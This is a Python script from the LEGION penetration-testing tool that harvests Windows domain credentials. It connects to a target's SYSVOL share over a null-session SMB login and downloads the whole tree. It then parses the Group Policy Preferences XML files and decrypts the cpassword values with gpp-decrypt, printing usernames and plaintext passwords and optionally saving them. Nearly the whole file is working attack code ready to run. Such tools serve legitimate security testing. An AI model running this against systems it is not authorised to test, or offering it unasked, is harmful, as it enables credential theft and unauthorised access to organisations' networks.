#!/usr/bin/env python3

"""
LEGION (https://github.com/ThereAreSomeWhoCallMeTimAtViasat/legion)
Author: Tim McLean (Viasat, Inc.)
Copyright (c) 2025-2026 Viasat, Inc.
Copyright (c) 2025 Shane William Scott (original Legion)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful, but
    WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
    General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program. If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED BY VIASAT, INC. "AS IS" AND ANY EXPRESS OR
IMPLIED WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL VIASAT, INC. BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE.
"""

"""Extract GPP passwords from SYSVOL via null-session SMB.

Usage: gpp_check.py <target_ip> [output_prefix]

Connects to //target/SYSVOL with a null session, recursively downloads
XML files that may contain Group Policy Preferences cpassword values,
decrypts them with gpp-decrypt, and prints results.
"""
import os
import shutil
import subprocess
import sys
import tempfile
import xml.etree.ElementTree as ET

GPP_FILES = (
    'Groups.xml', 'Services.xml', 'Scheduledtasks.xml',
    'DataSources.xml', 'Printers.xml', 'Drives.xml',
)


def _download_sysvol(ip, dest):
    """Download SYSVOL tree via null-session smbclient."""
    cmd = [
        'smbclient', f'//{ip}/SYSVOL', '-N',
        '-c', 'recurse;prompt OFF;lcd {};mget *'.format(dest),
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    print(result.stdout)
    if result.stderr:
        for line in result.stderr.splitlines():
            if 'NT_STATUS_' in line:
                print(f'[GPP] SMB error: {line}')
    return result.returncode


def _find_gpp_files(root):
    """Walk the download tree for GPP XML files."""
    found = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn in GPP_FILES:
                found.append(os.path.join(dirpath, fn))
    return found


def _extract_cpasswords(xml_path):
    """Parse XML for cpassword attributes. Returns list of (user, cpassword, source)."""
    results = []
    try:
        tree = ET.parse(xml_path)
    except ET.ParseError:
        return results
    for elem in tree.iter():
        props = elem.find('Properties')
        if props is None:
            continue
        cpass = props.get('cpassword', '')
        if not cpass:
            continue
        user = props.get('userName') or props.get('accountName') or props.get('runAs') or '(unknown)'
        results.append((user, cpass, os.path.basename(xml_path)))
    return results


def _decrypt(cpassword):
    """Call gpp-decrypt to decrypt a cpassword value."""
    if not shutil.which('gpp-decrypt'):
        return f'(gpp-decrypt not installed — raw: {cpassword})'
    try:
        result = subprocess.run(
            ['gpp-decrypt', cpassword],
            capture_output=True, text=True, timeout=10,
        )
        return result.stdout.strip() or result.stderr.strip() or '(empty)'
    except Exception as e:
        return f'(decrypt error: {e})'


def main():
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_ip> [output_prefix]')
        sys.exit(1)

    ip = sys.argv[1]
    output_prefix = sys.argv[2] if len(sys.argv) > 2 else None

    tmpdir = tempfile.mkdtemp(prefix='gpp_check_')
    print(f'[GPP] Target: {ip}')
    print(f'[GPP] Downloading SYSVOL via null session...')

    try:
        rc = _download_sysvol(ip, tmpdir)
        if rc != 0:
            print(f'[GPP] smbclient exited with code {rc}')

        xml_files = _find_gpp_files(tmpdir)
        if not xml_files:
            print('[GPP] No GPP XML files found in SYSVOL.')
            print('[GPP] SYSVOL may be empty, access denied, or no GPP policies exist.')
            return

        print(f'[GPP] Found {len(xml_files)} GPP XML file(s)')
        all_findings = []
        for path in xml_files:
            entries = _extract_cpasswords(path)
            for user, cpass, source in entries:
                password = _decrypt(cpass)
                finding = f'[GPP] User: {user}  Password: {password}  Source: {source}'
                print(finding)
                all_findings.append(finding)

        if not all_findings:
            print('[GPP] GPP XML files found but no cpassword attributes detected.')

        if output_prefix and all_findings:
            out_path = output_prefix + '.txt'
            with open(out_path, 'w') as f:
                f.write('\n'.join(all_findings) + '\n')
            print(f'[GPP] Results written to {out_path}')

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


if __name__ == '__main__':
    main()
